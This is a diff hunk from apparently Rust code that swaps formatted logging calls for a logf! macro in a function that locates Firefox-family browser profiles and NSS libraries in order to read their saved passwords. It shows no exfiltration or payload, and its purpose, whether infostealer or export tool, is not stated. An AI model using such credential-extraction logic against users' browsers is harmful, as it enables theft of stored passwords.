@@ -581,23 +581,23 @@ pub fn extract_all() -> Vec<(String, String)> {
             continue;
         }
 
-        crate::log::log(&format!(
+        crate::logf!(
             "gecko found: {} -> {}",
             browser.name,
             browser.profiles_path.display()
-        ));
+        );
         let nss_dir = find_nss_dir(browser.name);
         if nss_dir.is_some() {
-            crate::log::log(&format!("gecko nss OK: {}", browser.name));
+            crate::logf!("gecko nss OK: {}", browser.name);
         } else {
-            crate::log::log(&format!("gecko nss missing: {}", browser.name));
+            crate::logf!("gecko nss missing: {}", browser.name);
         }
         let profiles = get_profiles(&browser.profiles_path);
-        crate::log::log(&format!(
+        crate::logf!(
             "gecko {}: {} profile(s)",
             browser.name,
             profiles.len()
-        ));
+        );
 
         for (profile_name, profile_path) in profiles {
             let passwords = nss_dir
